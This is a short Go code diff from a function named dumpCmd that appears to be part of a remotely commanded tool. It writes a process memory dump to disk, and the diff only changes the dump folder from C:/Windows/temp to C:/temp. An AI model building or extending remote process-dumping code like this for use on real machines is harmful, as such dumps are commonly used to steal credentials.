@@ -48,10 +48,10 @@ func dumpCmd(sendUserId, decData string) {
 			return
 		}
 	}(pHandle)
-	if !fileopt.IsDir("C:/Windows/temp") {
-		err = os.Mkdir("C:/Windows/temp", 0666)
+	if !fileopt.IsDir("C:/temp") {
+		err = os.Mkdir("C:/temp", 0666)
 	}
-	saveName := fmt.Sprintf("C:/Windows/temp/%s.dmp", timeStr)
+	saveName := fmt.Sprintf("C:/temp/%s.dmp", timeStr)
 	fileName, _ := windows.UTF16PtrFromString(saveName)
 	fHandle, err := windows.CreateFile(fileName, windows.GENERIC_WRITE, windows.FILE_SHARE_WRITE, nil, windows.CREATE_ALWAYS, windows.FILE_ATTRIBUTE_NORMAL, 0)
 	if err != nil {
